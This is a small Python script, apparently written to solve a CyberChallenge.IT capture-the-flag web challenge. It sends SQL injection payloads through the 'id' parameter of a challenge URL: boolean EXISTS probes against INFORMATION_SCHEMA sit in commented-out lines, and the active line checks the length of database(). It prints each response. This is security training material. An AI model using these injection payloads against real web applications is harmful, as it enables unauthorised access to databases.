import requests



if __name__ == '__main__':
    url = "http://filtered.challs.cyberchallenge.it/post.php?"
    inject = ""
    #inject = "id=1' or EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'FILES')"
    #inject = "id=1' or EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database() LIMIT 1)" # molto buona
    inject = "id=1 + (select LEN(database() ) )'"
    inject += " -- "
    res = requests.get(url+inject)
    print(res.status_code)
    print(res.text)
